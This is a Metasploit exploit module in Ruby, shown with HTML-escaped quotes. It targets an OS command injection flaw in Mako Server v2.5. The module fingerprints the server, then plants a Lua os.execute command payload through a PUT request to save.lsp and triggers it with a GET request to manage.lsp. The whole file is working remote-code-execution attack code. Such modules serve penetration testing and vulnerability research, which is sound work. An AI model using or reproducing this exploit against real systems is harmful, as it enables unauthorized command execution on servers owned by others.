# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Mako Server v2.5 OS Command Injection RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Mako Server v2.5.
        It&#039;s possible to inject arbitrary OS commands in the Mako Server
        tutorial page through a PUT request to save.lsp.

        Attacker input will be saved on the victims machine and can
        be executed by sending a GET request to manage.lsp.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;John Page (hyp3rlinx) - Beyond Security SecuriTeam Secure Disclosure&#039;, # Vulnerability discovery & PoC
          &#039;Steven Patterson (Shogun Lab) <steven[at]shogunlab.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;42683&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/3391&#039;]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Mako Server v2.5 - Windows x86/x64&#039;, { }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Sep 3 2017&#039;))

    register_options(
      [
        OptString.new(&#039;URI&#039;, [true, &#039;URI path to the Mako Server app&#039;, &#039;/&#039;])
      ]
    )
  end

  def check
    vprint_status(&#039;Trying to detect running Mako Server and necessary files...&#039;)

    # Send GET request to determine existence of save.lsp page
    res = send_request_cgi({
             &#039;method&#039; => &#039;GET&#039;,
             &#039;uri&#039;    => normalize_uri(datastore[&#039;URI&#039;], &#039;examples/save.lsp&#039;)
           }, 20)

    # If response does not include "MakoServer.net", target is not viable.
    if res.headers[&#039;Server&#039;] !~ /MakoServer.net/
      vprint_warning(&#039;Target is not a Mako Server.&#039;)
      return CheckCode::Safe
    end

    if res.body
      if res.body =~ /Incorrect usage/
        # We are able to determine that the server has a save.lsp page and
        # returns the correct output.
        vprint_status(&#039;Mako Server save.lsp returns correct ouput.&#039;)
        return CheckCode::Appears
      else
        # The page exists, but is not returning the expected output.
        # May be a different version?
        vprint_warning(&#039;Mako Server save.lsp did not return expected output.&#039;)
        return CheckCode::Detected
      end
    else
      # The above checks failed and exploitability could not be determined.
      vprint_error(&#039;Unable to determine exploitability, save.lsp not found.&#039;)
      return CheckCode::Unknown
    end

    return CheckCode::Safe
  end

  def exploit
    print_status(&#039;Sending payload to target...&#039;)

    # The double square brackets helps to ensure single/double quotes
    # in cmd payload do not interfere with syntax of os.execute Lua function.
    cmd = %{os.execute([[#{payload.encoded}]])}

    # If users want to troubleshoot their cmd payloads, they can see the
    # Lua function with params that the module uses in a more verbose mode.
    vprint_status("Now executing the following command: #{cmd}")

    # Send a PUT request to save.lsp with command payload
    begin
      vprint_status(&#039;Sending PUT request to save.lsp...&#039;)
      send_request_cgi({
         &#039;method&#039; => &#039;PUT&#039;,
         &#039;uri&#039;    => normalize_uri(datastore[&#039;URI&#039;], &#039;examples/save.lsp?ex=2.1&#039;),
         &#039;ctype&#039;  => &#039;text/plain&#039;,
         &#039;data&#039;   => cmd,
         &#039;http&#039;   => {
           &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
           &#039;Referer&#039; => &#039;http://localhost/Lua-Types.lsp&#039;
         }
       }, 20)
    rescue StandardError => e
      fail_with(Failure::NoAccess, "Error: #{e}")
    end

    # Send a GET request to manage.lsp with execute set to true
    begin
      vprint_status(&#039;Sending GET request to manage.lsp...&#039;)
      send_request_cgi({
         &#039;method&#039; => &#039;GET&#039;,
         &#039;uri&#039;    => normalize_uri(datastore[&#039;URI&#039;], &#039;examples/manage.lsp?execute=true&ex=2.1&type=lua&#039;)
       }, 20)
    rescue StandardError => e
      fail_with(Failure::NoAccess, "Error: #{e}")
    end
  end
end

